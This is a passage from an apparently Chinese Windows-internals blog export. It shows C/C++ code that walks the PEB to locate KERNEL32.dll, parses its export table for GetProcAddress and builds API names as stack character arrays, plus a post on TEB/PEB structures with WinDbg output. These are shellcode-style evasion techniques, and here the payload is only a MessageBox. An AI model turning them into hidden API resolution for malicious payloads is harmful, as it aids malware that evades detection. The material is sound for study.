&#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27; &#125;; int nFlags = 0; for (size_t j = 0; j &lt; 14; j++) &#123; if (szFuncName[j] == szGetProAddress[j]) &#123; nFlags++; &#125; if (nFlags == 14) &#123; dwGetProcAddress = (DWORD)(dwAddrOfFunctions[dwAddrOfNameOrds[i]] + dwKernel32); break; &#125; &#125;&#125; 定义相关函数字符串以及函数原型并调用 定义函数名称时不能使用常量字符串, 因为程序会将字符串放在常量区段, 所以要对字符串进行打散处理, 以这种方式定义会将字符串存放在堆栈区域; 123456789101112131415161718192021222324252627282930313233343536// 定义LoadLibraryW函数字符串char szLoadLibraryW[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义MessageBoxW函数字符串char szMessagesBoxW[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义KERNEL32.dll字符串char szKernel32[] = &#123; &#x27;K&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;n&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;3&#x27;, &#x27;2&#x27;, &#x27;.&#x27;, &#x27;d&#x27;, &#x27;l&#x27;, &#x27;l&#x27;,&#x27;\\0&#x27; &#125;;// 定义ExitProcess函数字符串char szExitProcss[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;;// 定义user32.dll字符串WCHAR szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;, &#x27;\\0&#x27; &#125;;WCHAR szDokey[] = &#123; &#x27;D&#x27;,&#x27;o&#x27;,&#x27;k&#x27;,&#x27;e&#x27;,&#x27;y&#x27;,&#x27;\\0&#x27; &#125;;// 定义LoadLibraryW函数typedef HMODULE(WINAPI* MyLoadLibraryW)(_In_ LPCWSTR lpLibFileName);// 定义GetProcAddress函数typedef FARPROC(WINAPI* MyGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);// 定义MessageBoxW函数typedef int (WINAPI* MyMessageBoxW)(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType);// 定义ExitProcess函数typedef VOID(WINAPI* MyExitProcess)(_In_ UINT uExitCode);HMODULE hKernel = (HMODULE)dwKernel32;MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;if (pFuncGetProcAddress == NULL)&#123; return -1;&#125;MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)pFuncGetProcAddress(hKernel, szLoadLibraryW);if (NULL == pFuncLoadLibraryW)&#123; return -1;&#125;HMODULE hUser32 = pFuncLoadLibraryW((LPCWSTR)szUser32);MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)pFuncGetProcAddress(hUser32, szMessagesBoxW);pFuncMessageBoxW(NULL, szDokey, (LPCWSTR)szDokey, MB_OK);MyExitProcess pFuncExitProcess = (MyExitProcess)pFuncGetProcAddress(hKernel, szExitProcss);pFuncExitProcess(0); x64位动态获取API 64位下通过gs:[0]寄存器获取TEB, 然后偏移0x60得到PEB; 64位下和32位获取方式不同; 解析TEP&#x2F;PEB获取KERNEL32.dll基址 需要包含winternl.h和intrin.h两个头文件; 1234567891011121314151617181920212223 // 通过PEB获取KERNEL32.dll基址PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60));if (!pPeb)&#123; return -1;&#125;// 计算Ldr地址的偏移量ULONG64 ldrOrder = 0x18;// 获取_PEB_LDR_DATAPVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOrder);if (!pLdr)&#123; return -1;&#125;// 计算InMemoryOrderModuleList地址的偏移量ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);// 计算InMemoryOrderModuleList地址PLIST_ENTRY pModList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset);// 获取KERNEL32.dll基址PLIST_ENTRY pKernel32Entry = pModList-&gt;Flink-&gt;Flink-&gt;Flink;PLDR_DATA_TABLE_ENTRY pKernelTableEntry = CONTAINING_RECORD(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); // 获取KERNEL32.dll基址PVOID pKernelBase = pKernelTableEntry-&gt;DllBase; 解析PE, 获取GetProcAddress 和32位一样, 解析PE遍历导出表获取GetProcAddress函数地址; 123456789101112131415161718192021222324252627282930313233343536373839 // 解析PEPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase; // 获取NT头PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pKernelBase);// 获取导出表虚拟地址 PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);// 通过导出表虚拟地址获取导出表 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pKernelBase); // 获取函数地址表PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pKernelBase);// 获取函数名称表 PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pKernelBase);// 获取函数序号表 PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pKernelBase); // 获取函数名称总数DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;DWORD64 dwGetProcAddress = 0; // 通过函数名称总数遍历for (size_t i = 0; i &lt; dwNumberOfNames; i++)&#123; // 获取函数名 const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD64)pKernelBase); // 局部变量 char szGetProcAddress[] = &#123;&#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;&#125;; int nFlags = 0; for (size_t j = 0; j &lt; 14; j++) &#123; if (szFuncName[j] == szGetProcAddress[j]) &#123; nFlags++; &#125; if (nFlags == 14) &#123; dwGetProcAddress = (DWORD64)(pwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD64)pKernelBase); break; &#125; &#125;&#125; 定义相关函数字符串以及函数原型并调用1234567891011121314151617181920212223242526272829303132 // 定义LoadLibraryW字符串 char szLoadLibraryW[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义MessagesBoxW字符串char szMessagesBoxW[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;; // 定义KERNEL32.dll字符串char szKernel32[] = &#123; &#x27;K&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;n&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;3&#x27;, &#x27;2&#x27;, &#x27;.&#x27;, &#x27;d&#x27;, &#x27;l&#x27;, &#x27;l&#x27;,&#x27;\\0&#x27; &#125;; // 定义ExitProcss字符串char szExitProcss[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;;WCHAR szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;, &#x27;\\0&#x27; &#125;;WCHAR szDokey[] = &#123; &#x27;D&#x27;,&#x27;o&#x27;,&#x27;k&#x27;,&#x27;e&#x27;,&#x27;y&#x27;, &#x27;_&#x27;, &#x27;x&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;\\0&#x27; &#125;;typedef HMODULE(WINAPI* MyLoadLibraryW)(_In_ LPCWSTR lpLibFileName);typedef FARPROC(WINAPI* MyGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);typedef int (WINAPI* MyMessageBoxW)(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType);typedef VOID(WINAPI* MyExitProcess)(_In_ UINT uExitCode);HMODULE hKernel = (HMODULE)pKernelBase;MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;if (pFuncGetProcAddress == NULL)&#123; return -1;&#125;MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)pFuncGetProcAddress(hKernel, szLoadLibraryW);if (NULL == pFuncLoadLibraryW)&#123; return -1;&#125;HMODULE hUser32 = pFuncLoadLibraryW((LPCWSTR)szUser32);MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)pFuncGetProcAddress(hUser32, szMessagesBoxW);pFuncMessageBoxW(NULL, szDokey, (LPCWSTR)szDokey, MB_OK);MyExitProcess pFuncExitProcess = (MyExitProcess)pFuncGetProcAddress(hKernel, szExitProcss);pFuncExitProcess(0);","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"Windows进程环境块分析","slug":"Windows进程环境块分析","date":"2024-06-23T10:40:23.000Z","updated":"2024-06-27T08:27:50.028Z","comments":true,"path":"a214807a.html","link":"","permalink":"http://example.com/a214807a.html","excerpt":"TEBTEB(Thread Environment Block), 线程环境变量块, TEB中包含了线程的堆栈指针、TLS（线程本地存储）指针、异常处理链表指针、用户模式分页表指针等信息。TEB中fs寄存器通常被设置为fs:[0]（32位）, 指向当前线程的的TEB结构体。其他线程可以通过访问自己的TEB结构体来获取自己的状态和信息。 PEBPEB(Process Environment Block), 进程环境变量块, PEB中包含了进程的代码、数据段指针、进程的环境变量、进程启动参数信息以及加载的dll信息等。PEB结构体中的fs段寄存器通常被设置为0x30（32位）, 指向当前进程的PEB结构体。","text":"TEBTEB(Thread Environment Block), 线程环境变量块, TEB中包含了线程的堆栈指针、TLS（线程本地存储）指针、异常处理链表指针、用户模式分页表指针等信息。TEB中fs寄存器通常被设置为fs:[0]（32位）, 指向当前线程的的TEB结构体。其他线程可以通过访问自己的TEB结构体来获取自己的状态和信息。 PEBPEB(Process Environment Block), 进程环境变量块, PEB中包含了进程的代码、数据段指针、进程的环境变量、进程启动参数信息以及加载的dll信息等。PEB结构体中的fs段寄存器通常被设置为0x30（32位）, 指向当前进程的PEB结构体。 TEB的查找方式 32 bit 64 bit fs gs 32位TEB&#x2F;PEB查找TEB1234567890:000&gt; dt _TEBntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB // &lt;== 指向PEB... PEB 包含进程信息 1234567891011121314151617180:000&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // &lt;=== 指向PEB_LDR_DATA... PEB_LDR_DATA 包含有关为进程加载的模块的信息 PEB_LDR_DATA结构定义12345typedef struct _PEB_LDR_DATA &#123; BYTE Reserved1[8]; // 保留供操作系统内部使用 PVOID Reserved2[3]; // 保留供操作系统内部使用 LIST_ENTRY InMemoryOrderModuleList; // 包含进程的已加载模块的双向链表, 链表中的每个项都是指向LDR_DATA_TABLE_ENTRY结构的指针&#125; PEB_LDR_DATA, *PPEB_LDR_DATA; LIST_ENTRY 结构体定义1234typedef struct _LIST_ENTRY &#123; struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink;&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; _LIST_ENTRY: 这个双向链表指向进程装载的模块, 结构中每个指针, 指向了一个LDR_DATA_TABLE_ENTRY的结构; LDR_DATA_TABLE_ENTRY 结构定义123456789101112131415161718192021222324252627282930313233typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; WORD LoadCount; WORD TlsIndex; union &#123; LIST_ENTRY HashLinks; struct &#123; PVOID SectionPointer; ULONG CheckSum; &#125;; &#125;; union &#123; ULONG TimeDateStamp; PVOID LoadedImports; &#125;; _ACTIVATION_CONTEXT * EntryPointActivationContext; PVOID PatchInformation; LIST_ENTRY ForwarderLinks; LIST_ENTRY ServiceTagLinks; LIST_ENTRY StaticLinks;&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 查询PEB_LDR_DATA 在遍历InMemoryOrderModuleList时, 地址需要-0x08 12345678910110:000&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY // &lt;=== 模块加载的顺序 +0x014 InMemoryOrderModuleList : _LIST_ENTRY // &lt;=== 模块在内存的顺序 +0x01c InInitializationOrderModuleList : _LIST_ENTRY // &lt;=== 模块在内存的顺序 +0x024 EntryInProgress : Ptr32 Void +0x028 ShutdownInProgress : UChar +0x02c ShutdownThreadId : Ptr32 Void 查询LDR_DATA_TABLE_ENTRY 以InLoadOrderLinks 为示例 获取主模块（程序自身）123456789101112131415161718192021222324250:000&gt; dt -r1 0x014b41d8 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b40c0 - 0x77eceb2c ] +0x000 Flink : 0x014b40c0 _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x004 Blink : 0x77eceb2c _LIST_ENTRY [ 0x14b41d8 - 0x14b4810 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b40c8 - 0x77eceb34 ] +0x000 Flink : 0x014b40c8 _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x004 Blink : 0x77eceb34 _LIST_ENTRY [ 0x14b41e0 - 0x14b4818 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x000 Flink : (null) +0x004 Blink : (null) +0x018 DllBase : 0x00d80000 Void // Dll基址 +0x01c EntryPoint : 0x00dce118 Void +0x020 SizeOfImage : 0x126000 +0x024 FullDllName : _UNICODE_STRING &quot;D:\\\\xxx\\\\EnumModule.exe&quot; // 第一个模块为程序自身 +0x000 Length : 0xb2 +0x002 MaximumLength : 0xb4 +0x004 Buffer : 0x014b27dc &quot;D:\\\\xxx\\\\EnumModule.exe&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;EnumModule.exe&quot; +0x000 Length : 0x1c +0x002 MaximumLength : 0x1e +0x004 Buffer : 0x014b2872 &quot;EnumModule.exe&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 获取NtDll123456789101112131415161718192021222324250:000&gt; dt -r1 0x14b40c0 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x000 Flink : 0x014b45d0 _LIST_ENTRY [ 0x14b49c0 - 0x14b40c0 ] +0x004 Blink : 0x014b41d8 _LIST_ENTRY [ 0x14b40c0 - 0x77eceb2c ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x000 Flink : 0x014b45d8 _LIST_ENTRY [ 0x14b49c8 - 0x14b40c8 ] +0x004 Blink : 0x014b41e0 _LIST_ENTRY [ 0x14b40c8 - 0x77eceb34 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x14b49d0 - 0x77eceb3c ] +0x000 Flink : 0x014b49d0 _LIST_ENTRY [ 0x14b45e0 - 0x14b40d0 ] +0x004 Blink : 0x77eceb3c _LIST_ENTRY [ 0x14b40d0 - 0x14b4820 ] +0x018 DllBase : 0x77da0000 Void // &lt;=== 指向ntdll.dll的基址 +0x01c EntryPoint : (null) +0x020 SizeOfImage : 0x1b2000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x000 Length : 0x3a +0x002 MaximumLength : 0x3c +0x004 Buffer : 0x014b3fa0 &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;ntdll.dll&quot; +0x000 Length : 0x12 +0x002 MaximumLength : 0x14 +0x004 Buffer : 0x77dab4f8 &quot;ntdll.dll&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 获取Kernel32123456789101112131415161718192021222324250:000&gt; dt -r1 0x014b45d0 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x14b49c0 - 0x14b40c0 ] +0x000 Flink : 0x014b49c0 _LIST_ENTRY [ 0x14b4810 - 0x14b45d0 ] +0x004 Blink : 0x014b40c0 _LIST_ENTRY [ 0x14b45d0 - 0x14b41d8 ] +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x14b49c8 - 0x14b40c8 ] +0x000 Flink : 0x014b49c8 _LIST_ENTRY [ 0x14b4818 - 0x14b45d8 ] +0x004 Blink : 0x014b40c8 _LIST_ENTRY [ 0x14b45d8 - 0x14b41e0 ] +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x14b4820 - 0x14b49d0 ] +0x000 Flink : 0x014b4820 _LIST_ENTRY [ 0x77eceb3c - 0x14b45e0 ] +0x004 Blink : 0x014b49d0 _LIST_ENTRY [ 0x14b45e0 - 0x14b40d0 ] +0x018 DllBase : 0x76310000 Void // &lt;=== 指向KERNEL32.DLL的基址 +0x01c EntryPoint : 0x763277c0 Void +0x020 SizeOfImage : 0xf0000 +0x024 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x000 Length : 0x40 +0x002 MaximumLength : 0x42 +0x004 Buffer : 0x014b46e8 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x02c BaseDllName : _UNICODE_STRING &quot;KERNEL32.DLL&quot; +0x000 Length : 0x18 +0x002 MaximumLength : 0x1a +0x004 Buffer : 0x014b4710 &quot;KERNEL32.DLL&quot; +0x034 FlagGroup : [4] &quot;???&quot;略... 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// Get_LDR_Data_Table.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;// InLoadOrderModuleListVOID GetInLoadOrderModuleList(DWORD* PEB)&#123; PDWORD Ldr = NULL; DWORD* InLoad = NULL; DWORD* Kernel32 = NULL; DWORD* p = NULL; DWORD* BaseAddress = NULL; DWORD* BaseDllName = NULL; DWORD* FullDllName = NULL; Ldr = *(PDWORD*)((unsigned char*)PEB + 0x0c); // printf(&quot;得到LDR指针：%x\\r\\n&quot;, Ldr); InLoad = *(DWORD**)((unsigned char*)Ldr + 0x0c); // printf(&quot;得到InLoadOrderModuleList结构指针：%x\\r\\n&quot;, InLoad); // Kernel32 = *(DWORD**)((unsigned char*)InLoad + 0x18); // printf(&quot;得到Kernel32基址：%x\\r\\n&quot;, Kernel32); p = InLoad; p = *((DWORD**)p); while (InLoad != p) &#123; BaseAddress = *((DWORD**)((unsigned char*)p + 0x18)); // DllBase BaseDllName = *((DWORD**)((unsigned char*)p + 0x30)); // BaseDllName FullDllName = *((DWORD**)((unsigned char*)p + 0x28)); // FullDllName if (BaseAddress ==0) &#123; break; &#125; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, BaseAddress, (unsigned char*)BaseDllName, (unsigned char*)FullDllName); p = *((DWORD**)p); &#125;&#125;// InMemoryOrderModuleListVOID GetInMemoryOrderModuleList(DWORD* PEB)&#123; DWORD* Ldr = NULL; DWORD* InMemory = NULL; DWORD* Kernel32 = NULL; DWORD* p = NULL; DWORD* BaseAddress = NULL; DWORD* BaseDllName = NULL; DWORD* FullDllName = NULL; Ldr = *(DWORD**)((unsigned char*)PEB + 0x0c); //printf(&quot;得到LDR结构指针：%x\\r\\n&quot;, Ldr); InMemory = *(DWORD**)((unsigned char*)Ldr + 0x14); //printf(&quot;得到InMemoryOrderModuleList结构指针：%x\\r\\n&quot;, InMemory); //Kernel32 = *(DWORD**)((unsigned char*)InMemory + 0x10); // printf(&quot;得到Kernel32基址：%x\\r\\n&quot;, Kernel32); p = InMemory; p = *((DWORD**)p); while (InMemory != p) &#123; BaseAddress = *((DWORD**)((unsigned char*)p + 0x10)); BaseDllName = *((DWORD**)((unsigned char*)p + 0x28)); FullDllName = *((DWORD**)((unsigned char*)p + 0x20)); if (BaseAddress == 0) &#123; break; &#125; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, BaseAddress, (const char*)BaseDllName, (const char*)FullDllName); p = *((DWORD**)p); &#125;&#125;int main()&#123; DWORD* PEB = NULL; __asm &#123; mov eax, fs:[0x30] mov PEB, eax &#125; printf(&quot;得到PEB指针：0x%08x\\r\\n&quot;, PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); GetInLoadOrderModuleList(PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); GetInMemoryOrderModuleList(PEB); printf(&quot;--------------------------------------------------------------------\\r\\n&quot;); _TEB* pTeb = NtCurrentTeb(); PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; PDWORD pModNtDll = (PDWORD)*pModExe; PDWORD pModKernel32 = (PDWORD)*pModNtDll; printf(&quot;镜像基址：0x%-20x 模块名称：%S\\r\\n ---&gt; 模块路径：%S\\n&quot;, pModKernel32[6], (const char*)pModKernel32[12], (const char*)pModKernel32[10]);&#125; 64位TEB&#x2F;PEB查找windbg查找 在遍历InMemoryOrderModuleList链表时, 地址需-0x10; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391400:000&gt; !pebPEB at 000000d737450000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: Yes ImageBaseAddress: 00007ff723010000 NtGlobalFlag: 70 NtGlobalFlag2: 0 Ldr 00007ffc29996440 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00000275005e4450 . 00000275005e4d20 Ldr.InLoadOrderModuleList: 00000275005e4620 . 00000275005edae0 Ldr.InMemoryOrderModuleList: 00000275005e4630 . 00000275005edaf0 Base TimeStamp Module 7ff723010000 666289ca Jun 07 12:17:14 2024 D:\\Tencent\\WeChat\\WeChat.exe 7ffc29810000 67ca8829 Mar 07 13:46:17 2025 C:\\WINDOWS\\SYSTEM32\\ntdll.dll 7ffc286f0000 36466623 Nov 09 11:48:51 1998 C:\\WINDOWS\\System32\\KERNEL32.DLL 7ffc270e0000 44653e19 May 13 10:02:01 2006 C:\\WINDOWS\\System32\\KERNELBASE.dll 7ffc27630000 3b26444f Jun 13 00:33:19 2001 C:\\WINDOWS\\System32\\USER32.dll 7ffc26e70000 331718eb Mar 01 01:42:03 1997 C:\\WINDOWS\\System32\\win32u.dll 7ffc286c0000 533dc7aa Apr 04 04:42:18 2014 C:\\WINDOWS\\System32\\GDI32.dll 7ffc26f20000 05ca1d5d Jan 29 13:04:29 1973 C:\\WINDOWS\\System32\\gdi32full.dll 7ffc27040000 8e0806c9 Jul 06 02:04:57 2045 C:\\WINDOWS\\System32\\msvcp_win.dll 7ffc26b40000 10c46e71 Dec 01 05:19:45 1978 C:\\WINDOWS\\System32\\ucrtbase.dll 7ffc29410000 dac79f47 Apr 25 03:38:47 2086 C:\\WINDOWS\\System32\\ADVAPI32.dll 7ffc28be0000 657b2709 Dec 15 00:02:17 2023 C:\\WINDOWS\\System32\\msvcrt.dll 7ffc28580000 47af1f27 Feb 10 23:58:31 2008 C:\\WINDOWS\\System32\\sechost.dll 7ffc26c60000 5a31de46 Dec 14 10:13:26 2017 C:\\WINDOWS\\System32\\bcrypt.dll 7ffc29130000 1caf5f33 Apr 02 10:00:19 1985 C:\\WINDOWS\\System32\\RPCRT4.dll 7ffc27a10000 8ec472d1 Nov 26 00:12:01 2045 C:\\WINDOWS\\System32\\SHELL32.dll 7ffc283c0000 99614267 Jul 18 18:13:59 2051 C:\\WINDOWS\\System32\\ole32.dll 7ffc287d0000 eadd58d3 Nov 12 12:32:19 2094 C:\\WINDOWS\\System32\\combase.dll 7ffc294d0000 672b2c78 Nov 06 16:44:40 2024 C:\\WINDOWS\\System32\\SHLWAPI.dll 7ffc06d90000 1aaf409d Mar 09 23:09:17 1984 C:\\WINDOWS\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.22621.3672_none_57feacb6ce14a323\\gdiplus.dll略...0:000&gt; dt -r1 0x00000275005e4630-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e4430 - 0x00007ffc`29996450 ] +0x000 Flink : 0x00000275`005e4430 _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x008 Blink : 0x00007ffc`29996450 _LIST_ENTRY [ 0x00000275`005e4620 - 0x00000275`005edae0 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e4440 - 0x00007ffc`29996460 ] +0x000 Flink : 0x00000275`005e4440 _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x008 Blink : 0x00007ffc`29996460 _LIST_ENTRY [ 0x00000275`005e4630 - 0x00000275`005edaf0 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x000 Flink : (null) +0x008 Blink : (null) +0x030 DllBase : 0x00007ff7`23010000 Void // &lt;=== 指向程序本身 +0x038 EntryPoint : 0x00007ff7`2301c148 Void +0x040 SizeOfImage : 0xa5000 +0x048 FullDllName : _UNICODE_STRING &quot;D:\\\\Tencent\\\\WeChat\\\\WeChat.exe&quot; +0x000 Length : 0x38 +0x002 MaximumLength : 0x3a +0x008 Buffer : 0x00000275`005e41c0 